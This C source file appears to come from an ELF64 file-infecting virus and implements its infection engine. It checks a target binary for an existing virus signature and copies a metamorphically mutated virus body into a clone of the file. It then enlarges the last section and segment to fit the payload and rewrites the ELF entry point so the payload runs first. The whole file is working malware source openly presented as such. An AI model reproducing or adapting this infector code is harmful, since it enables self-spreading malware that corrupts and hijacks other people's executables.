#include "virus.h"
#include "utils.h"
#include "errors.h"
#include "compiler_utils.h"

/*
** if current binary is already our client, don't infect again ! <3
*/
static bool	not_infected(const struct entry *file_entry,
			struct safe_ptr file_ref, size_t dist_entry_header)
{
	const Elf64_Off	sh_offset        = file_entry->safe_shdr->sh_offset;
	const size_t	entry_offset     = sh_offset + file_entry->offset_in_section;
	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
	const char	 *signature      = safe(file_ref, signature_offset, SIGNATURE_LEN);

	if (signature == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);

	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);

	return true;
}

static bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry)
{
	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr)  return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	const Elf64_Xword	sh_offset         = file_entry->safe_shdr->sh_offset;
	const size_t		offset_in_section = file_entry->offset_in_section;
	const size_t		entry_off         = sh_offset + offset_in_section;
	const size_t		payload_offset    = file_entry->end_of_last_section;
	const Elf64_Xword	payload_distance  = payload_offset - entry_off;

	Elf64_Addr		e_entry = hdr->e_entry;

	e_entry += payload_distance;
	hdr->e_entry = e_entry;

	return true;
}

static bool	adjust_sizes(struct entry *clone_entry,
			size_t shift_amount, size_t full_virus_size)
{
	clone_entry->safe_last_section_shdr->sh_size += full_virus_size;
	clone_entry->safe_phdr->p_filesz             += shift_amount;
	clone_entry->safe_phdr->p_memsz              += shift_amount;

	return true;
}

static bool	define_shift_amount(const struct entry *file_entry,
			size_t *shift_amount, size_t full_virus_size)
{
	const size_t	p_filesz        = file_entry->safe_phdr->p_filesz;
	const size_t	p_offset        = file_entry->safe_phdr->p_offset;
	const size_t	segment_end     = p_offset + p_filesz;
	const size_t	segment_padding = segment_end - file_entry->end_of_last_section;

	if (full_virus_size < segment_padding)
	{
		*shift_amount = 0;
		return true;
	}

	const size_t	p_memsz = file_entry->safe_phdr->p_memsz;
	const size_t	p_align = file_entry->safe_phdr->p_align;

	// shift_amount aligned to Elf64 Segments alignement requirements
	*shift_amount = ALIGN(full_virus_size, PAGE_ALIGNMENT);

	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;

	if (end_padding > p_align)
		return errors(ERR_VIRUS, _ERR_V_NOT_ENOUGH_PADDING);

	return true;
}

bool		infection_engine(struct virus_header *vhdr,
			struct safe_ptr file_ref, struct safe_ptr clone_ref,
			size_t *shift_amount)
{
	struct entry	file_entry;
	struct entry	clone_entry;
	const size_t	*loader_off      = &file_entry.end_of_last_section;     // init by <find_entry>
	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>

	if (!find_entry(&file_entry, file_ref)
	|| !not_infected(&file_entry, file_ref, vhdr->dist_header_loader)
	|| !copy_virus_to_clone(clone_ref, &file_entry, vhdr)
	|| !generate_seed(seed, file_ref)
	|| !metamorph_clone(clone_ref, *loader_off, *seed, full_virus_size, vhdr)
	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
	|| !copy_client_to_clone(clone_ref, file_ref, *loader_off, *shift_amount)
	|| !adjust_references(clone_ref, *shift_amount, *loader_off)
	|| !find_entry(&clone_entry, clone_ref)
	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
	|| !change_entry(clone_ref, &file_entry))
		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);

	return true;
}
